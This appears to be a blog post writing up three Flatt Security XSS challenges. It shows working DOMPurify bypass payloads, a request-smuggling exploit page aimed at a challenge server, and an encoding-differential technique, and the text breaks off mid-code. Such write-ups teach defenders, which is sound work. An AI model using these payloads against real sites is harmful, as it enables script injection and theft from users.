<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v9.2.1 <https://hydejack.com/>
--><head> <title>Flatt Security XSS Challenge - Writeup | maitai's blog</title> <meta name="description" content=" "> <link rel="canonical" href="http://localhost:4000/2024/11/29/flatt-xss-writeup.html"> <meta name="color-scheme" content="light"> <meta name="theme-color" content="rgb(8,46,57)"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"> <meta http-equiv="x-ua-compatible" content="ie=edge"> <meta name="mobile-web-app-capable" content="yes"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta name="apple-mobile-web-app-title" content="maitai's blog"> <meta name="apple-mobile-web-app-status-bar-style" content="default"> <meta name="application-name" content="maitai's blog"> <meta name="generator" content="Hydejack v9.2.1" /> <link rel="alternate" href="http://localhost:4000/2024/11/29/flatt-xss-writeup.html" hreflang="en"> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="maitai&apos;s blog" /> <link rel="shortcut icon" href="/assets/icons/favicon.ico"> <link rel="apple-touch-icon" href="/assets/icons/icon-192x192.png"> <link rel="manifest" href="/assets/site.webmanifest"> <link rel="preload" href="/assets/img/swipe.svg" as="image" id="_hrefSwipeSVG"> <script>((r,a)=>{function d(e,t,n,o){e.addEventListener?e.addEventListener(t,n,o):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}r.loadJS=function(e,t){var n=a.createElement("script"),e=(n.src=e,t&&d(n,"load",t,{once:!0}),a.scripts[0]);return e.parentNode.insertBefore(n,e),n},r._loaded=!1,r.loadJSDeferred=function(e,t){var n=a.createElement("script");function o(){r._loaded=!0,t&&d(n,"load",t,{once:!0});var e=a.scripts[0];e.parentNode.insertBefore(n,e)}return n.src=e,r._loaded?o():d(r,"load",o,{once:!0}),n},r.setRel=r.setRelStylesheet=function(e){d(a.getElementById(e),"load",function(){this.rel="stylesheet"},{once:!0})}})(window,document); !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); !function(w) { w._baseURL = '/'; w._publicPath = '/assets/js/'; w._noPushState = false; w._noDrawer = false; w._noNavbar = false; w._noToc = false; w._noSearch = false; w._search = { DATA_URL: '/assets/sitedata.json?no-cache', STORAGE_KEY: 'mini-search/', INDEX_KEY: 'index--2024-12-30T22:23:25+01:00', }; w._clapButton = true; }(window);</script> <script async src="/assets/bower_components/MathJax/es5/tex-mml-chtml.js" id="_MathJax"></script> <!--[if gt IE 8]><!----> <link rel="stylesheet" href="/assets/css/hydejack-9.2.1.css" id="_stylePreload"> <link rel="stylesheet" href="/assets/icomoon/style.css" id="_iconsPreload"> <style id="_pageStyle"> html { --accent-color: rgb(79,177,186); --accent-color-faded: rgba(79, 177, 186, 0.5); --accent-color-highlight: rgba(79, 177, 186, 0.1); --accent-color-darkened: #409ba3; --theme-color: rgb(8,46,57); --dark-mode-body-bg: #282f31; --dark-mode-border-color: #343c3f; } </style> <!--<![endif]--> </head> <body class=""> <hy-push-state id="_pushState" replace-selector="#_main" link-selector="a[href]:not([href^='/assets/']):not(.external):not(.no-push-state)" script-selector="script" duration="500" hashchange > <div id="_navbar" class="navbar fixed-top"> <div class="content"> <span class="sr-only">Jump to:</span> <div class="nav-btn-bar"> <a id="_menu" class="nav-btn no-hover" href="#_drawer--opened"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a> <div class="nav-span"></div> </div> </div> </div> <hr class="sr-only" hidden /> <main id="_main" class="content layout-post" role="main" > <nav id="breadcrumbs" class="screen-only"><ul> <li><a href="/">home</a></li> <li> <span>/</span> <a href="/2024/">2024</a> </li> <li> <span>/</span> <a href="/2024/11/">11</a> </li> <li> <span>/</span> <a href="/2024/11/29/">29</a> </li> <li> <span>/</span> <span>flatt-xss-writeup.html</span> </li> </ul></nav> <article id="post-2024-11-29-flatt-xss-writeup" class="page post mb6" role="article"> <header> <h1 class="post-title flip-project-title"> Flatt Security XSS Challenge - Writeup </h1> <div class="post-date"> <span class="ellipsis mr1"> <time datetime="2024-11-29T00:00:00+01:00">29 Nov 2024</time> </span> </div> <div class="hr pb0"></div> </header> <p><img src="/images/flatt-xss/Screenshot 2024-11-29 at 18.12.06.png" alt="Image 1" /></p> <p>Impossible not to play.</p> <h2 id="server-side-sanitization-by-hamayanhamayan">Server-Side Sanitization by hamayanhamayan</h2> <p>This was the easiest among all the challenges, yet it teaches a nice quirk to achieve XSS when <mark style="background: #FFB86CA6;">server-side sanitization</mark> is applied.</p> <p>The challenge is straightforward.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">createDOMPurify</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dompurify</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">JSDOM</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsdom</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nb">window</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSDOM</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nb">window</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">DOMPurify</span> <span class="o">=</span> <span class="nx">createDOMPurify</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">message</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">message</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">`/?message=Yes%2C%20&lt;b&gt;we%20can&lt;%2Fb&gt;%21`</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">view</span><span class="p">(</span><span class="dl">"</span><span class="s2">/index.ejs</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">sanitized</span><span class="p">:</span> <span class="nx">sanitized</span> <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div> <p>There is some server-side logic where a query parameter is sanitized via my everlasting enemy DOMPurify. Once sanitized, the payload is reflected into the page in two different points.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h1&gt;</span>Paper Airplane<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"message"</span><span class="nt">&gt;&lt;</span><span class="err">%</span><span class="na">-</span> <span class="na">sanitized</span> <span class="err">%</span><span class="nt">&gt;&lt;/b&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"get"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
        <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"message"</span><span class="nt">&gt;&lt;</span><span class="err">%</span><span class="na">-</span> <span class="na">sanitized</span> <span class="err">%</span><span class="nt">&gt;&lt;/textarea&gt;</span>
        <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"View 👀"</span> <span class="na">formaction=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div> <p>How we can achieve XSS is quite simple. Essentially the sanitization that occurs server side has no context on what will be the context where our payload will be reflected.</p> <p>By leveraging this assumption we can carefully create an HTML tag that when injected into the browser breaks the context but will be completely ignored by DOMPurify. How? By using <mark style="background: #FFB86CA6;">attributes</mark></p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">'&lt;/textarea&gt;&lt;img src=a onerror=alert(origin)&gt;'</span><span class="nt">/&gt;</span>
</code></pre></div></div> <p>The content of the <code class="language-plaintext highlighter-rouge">id</code> attribute will be completely ignored by DOMPurify, but when injected into the page it will break the <code class="language-plaintext highlighter-rouge">textarea</code> tag, leaving our malicious tag untouched. Hence, an alert will pop up</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h1&gt;</span>Paper Airplane<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"message"</span><span class="nt">&gt;&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=a onerror=alert(origin)&gt;"</span><span class="nt">&gt;&lt;/a&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"get"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
        <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"message"</span><span class="nt">&gt;</span><span class="ni">&amp;lt;</span>a id="<span class="nt">&lt;/textarea&gt;&lt;img</span> <span class="na">src=</span><span class="s">"a"</span> <span class="na">onerror=</span><span class="s">"alert(origin)"</span><span class="nt">&gt;</span>"<span class="ni">&amp;gt;</span>
        <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"View 👀"</span> <span class="na">formaction=</span><span class="s">"/"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div> <h2 id="client-side-desync-by-ryotak---w-smaury92">Client-Side Desync by RyotaK - w/ smaury92</h2> <p>The challenge is not straightforward. It mimics an html editor, with a couple of twists. We can inject arbitrary html code on the editor, this will be saved server-side by giving it an UUIDv4 which later will be used to retrieve it. Sounds quite simple right? The problem is that when retrieved our HTML code will be converted using <code class="language-plaintext highlighter-rouge">html.escape</code> which uses <mark style="background: #FFB86CA6;">HTML entities</mark> to nullify our payload. This will be later injected into the page, but not before having sanitized it with a <mark style="background: #FFB86CA6;">custom sanitizer</mark>.</p> <p>This sounds unexploitable right? Well, in a standard use flow this is unbreakable, but by analyzing carefully the source code there is one thing that stands out.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">parsed_path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">parsed_path</span><span class="p">.</span><span class="n">path</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">parse_qs</span><span class="p">(</span><span class="n">parsed_path</span><span class="p">.</span><span class="n">query</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Cache-Control'</span><span class="p">,</span> <span class="s">'max-age=3600'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">content_type_html</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">index_html</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">))</span>
    <span class="k">elif</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/api/drafts"</span><span class="p">:</span>
        <span class="n">draft_id</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">,</span> <span class="p">[</span><span class="s">''</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">draft_id</span> <span class="ow">in</span> <span class="n">drafts</span><span class="p">:</span>
            <span class="n">escaped</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">escape</span><span class="p">(</span><span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">])</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">escaped</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="s">''</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
	    <span class="bp">self</span><span class="p">.</span><span class="n">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="s">'Path %s not found'</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">))</span>
</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">do_GET</code> method handles the case where the path that we are requesting does not exists. Our path will be reflected directly into the page, but <code class="language-plaintext highlighter-rouge">text/plain</code> will be used as Content-Type. This means that if we request something like <code class="language-plaintext highlighter-rouge">/&lt;img src=a&gt;</code> we will get a response like the following:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Path /&lt;img src=a&gt; not found
</code></pre></div></div> <p>As you may already noticed, the webserver used is really crappy. As soon as i’ve noticed it, my mind started to think about <mark style="background: #FFB86CA6;">request smuggling</mark>. Indeed, that’s the right path.</p> <p>Think about it. We cannot do nothing in the standard flow. So what if, we manage to smuggle a request? In our case, if we smuggle the request that retrieves the encoded HTML, we can achieve an injection. Still, there is the sanitizer to bypass, but one thing at a time.</p> <p>How is possible to achieve smuggling? Let’s read more code:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">content_length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'Content-Length'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Post is too large'</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="n">body</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
    <span class="n">draft_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid4</span><span class="p">())</span>
    <span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">draft_id</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">))</span>
</code></pre></div></div> <p>My first idea was to abuse something like setting the <code class="language-plaintext highlighter-rouge">Content-Length</code> to zero but providing a body that will be retrieved as a subsequential request. Unfortunately i don’t think it’s possible to set <code class="language-plaintext highlighter-rouge">Content-Length</code> to zero by using the Fetch API.</p> <p>The right idea, in this case, is to abuse the check performed on the <code class="language-plaintext highlighter-rouge">Content-Length</code>. If it’s greater than 100, an error is provided. But more importantly is that the content of the <mark style="background: #FFB86CA6;">body is not read</mark>. This will leave the content on the socket, and can be leveraged to smuggle the next request.</p> <p>Here is an example request that creates the smuggling:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">34.171.202.118</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">135</span>

GET /&lt;img src=A&gt; HTTP/1.1 
GET /&lt;img src=A&gt; HTTP/1.1 
GET /&lt;img src=A&gt; HTTP/1.1 
GET /&lt;img src=A&gt; HTTP/1.1 
GET /&lt;img src=A&gt; HTTP/1.1
</code></pre></div></div> <p>I was a bit <mark style="background: #FFB86CA6;">stucked</mark> at this point. Because the main problem is that we need to smuggle the request that retrieves the safe content from the backend. Here is where, by chatting with <mark style="background: #FFB86CA6;">smaury</mark>, the solution came up.</p> <p>The flow is the following:</p> <ul> <li>The bot visits the page</li> <li>On the page there is an <code class="language-plaintext highlighter-rouge">iframe</code> pointing to the challenge page with a valid ID used to retrieve the safe content</li> <li>On the same page there is also a <code class="language-plaintext highlighter-rouge">form</code> that will be summited using the <code class="language-plaintext highlighter-rouge">iframe</code> as target. This will be used in order to create the smuggling.</li> <li>The smuggling form will be autosubmitted after 1 second.</li> <li>After 1 more second, the iframe is redirected back to the homepage. This will not issue any request since the page is <mark style="background: #FFB86CA6;">cached</mark></li> <li>The page issue the request in order to retrieve the safe content, but it will recieve the unsanitized path containing our malicious HTML tag</li> <li>The XSS doesn’t pop, since there is the sanitizer :rofl:</li> </ul> <p>Jokes aside, there is the sanitizer to bypass. How i did it? By fuzzing. I’ve used a bunch of old mXSS payloads and tweaked the attributes in order to make everything works. I’ve not fully understood why my payload is working, but indeed it works.</p> <p>Here there’s the final payload:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"1000"</span> <span class="na">height=</span><span class="s">"1000"</span> <span class="na">id=</span><span class="s">"watermelon"</span> <span class="na">name=</span><span class="s">"watermelon"</span> <span class="na">src=</span><span class="s">"http://34.171.202.118/?draft_id=b6921e21-4951-4fc2-a209-789c5d7b509f"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
        <span class="nt">&lt;form</span> <span class="na">target=</span><span class="s">"watermelon"</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/api/drafts?id=b6921e21-4951-4fc2-a209-789c5d7b509f"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
        <span class="nt">&lt;/form&gt;</span>
        <span class="nt">&lt;script&gt;</span>
            <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;g/title="&lt;/style&gt;&lt;img/i/src/a/onerror=alert(origin)&gt;test&lt;/details&gt;"&gt; HTTP/1.1\r\n`</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
            <span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
                <span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">watermelon</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://34.171.202.118/?draft_id=b6921e21-4951-4fc2-a209-789c5d7b509f</span><span class="dl">"</span><span class="p">},</span><span class="mi">1000</span><span class="p">)</span>
            <span class="p">},</span><span class="mi">1000</span><span class="p">)</span>
        <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <p>I want to add one more thing. The usage of a <code class="language-plaintext highlighter-rouge">textarea</code> tag to hold the smuggle payload was something that i’ve took from another challenge. It’s mindblowing to me.</p> <h2 id="charset-shenanigans-by-kinugawamasato---w-strellic">Charset Shenanigans by kinugawamasato - w/ strellic</h2> <p>Honestly at the beginning i didn’t think that i’ve would be able to solve this challenge. The challenge doesn’t have any server side logic. Here is the core of it</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">render</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">createPermalink</span><span class="p">(</span><span class="nx">sanitizedHtml</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div> <p>Quite small, isn’t it? It’s difficult to think that there is an XSS in here, but indeed there is. My idea was to, somehow, the payload from DOMPurify and later executed into the Blob. There were two main issues:</p> <ul> <li>I don’t know how to do such thing</li> <li>DOMPurify was using a custom configuration where attributes were no longer usable.</li> </ul> <p>Let’s sort out the first thing. I started reading a bit about Blobs, and after a while i’ve noticed this.</p> <p><img src="/images/flatt-xss/Screenshot 2024-11-29 at 19.20.22.png" alt="Image 2" /></p> <p>In our case the Blob was not specifying the charset. That’s really weird, mainly because i’ve never seen Blobs used with charset, and was something that i didn’t know. Anyway this opened up a possibility: <mark style="background: #FFB86CA6;">encoding differential</mark>.</p> <p>The main idea is explained here https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/. In short, it explains how the charset affects how the browser parses the HTML on the page. Moreover it highlights a specific encoding <code class="language-plaintext highlighter-rouge">ISO-2022-JP</code> which can be leveraged to achieve XSS on pages where the <code class="language-plaintext highlighter-rouge">Content-Type</code> header has no charset specified.</p> <p>This can be leveraged in the challenge, if the main page wouldn’t specify the charset itself. This is where i spent the most time. I thought i was able to, somehow, fool the charset on the page since it was specified via a <code class="language-plaintext highlighter-rouge">meta</code> tag.</p> <p>Here is where <mark style="background: #FFB86CA6;">strellic</mark> told me that this was completely wrong. Instead i need to look carefully at <code class="language-plaintext highlighter-rouge">window.open</code>. So i quickly opened https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/ this and started searching for interesting quirks. And here is where i learned another new thing. Apparently if a page opens a window and specify the window name via <code class="language-plaintext highlighter-rouge">window.open('/','whatever')</code> if the opened page opens a page with the same name, the page will be opened as the <mark style="background: #FFB86CA6;">top window</mark>.</p> <p>The flow, now, is the following:</p> <ul> <li>The bot visits a page</li> <li>The page executes <code class="language-plaintext highlighter-rouge">window.open('https://challenge-kinugawa.quiz.flatt.training/?html=payload','iframe')</code></li> <li>The Blob on the challenge page will open the sanitized payload as the top window instead that on the iframe. This will lead to a page with semi-arbitrary content without any <mark style="background: #FFB86CA6;">charset</mark> specified. Hence we can leverage the usage of <code class="language-plaintext highlighter-rouge">ISO-2022-JP</code>in order to achieve XSS</li> </ul> <p>There’s one major problem here. No attributes are allowed. Hence it’s not that easy to hide a malicious payload from DOMPurify. By chatting again with strellic, it turns out that we simply need an <mark style="background: #FFB86CA6;">open tag</mark> and then achieving XSS would be possible. The only RAWTEXT element allowed by DOMPurify is the <code class="language-plaintext highlighter-rouge">style</code>tag. Anyway, DOMPurify denies the usage of something like this:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span><span class="o">&lt;</span><span class="nt">img&lt;/style&gt;</span>
</code></pre></div></div> <p>The dangling <code class="language-plaintext highlighter-rouge">img</code> tag will be completely removed from DOMPurify, since it has a regex like the following.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span>
      <span class="nx">SAFE_FOR_XML</span> <span class="o">&amp;&amp;</span>
      <span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeType</span> <span class="o">===</span> <span class="nx">NODE_TYPE</span><span class="p">.</span><span class="nx">comment</span> <span class="o">&amp;&amp;</span>
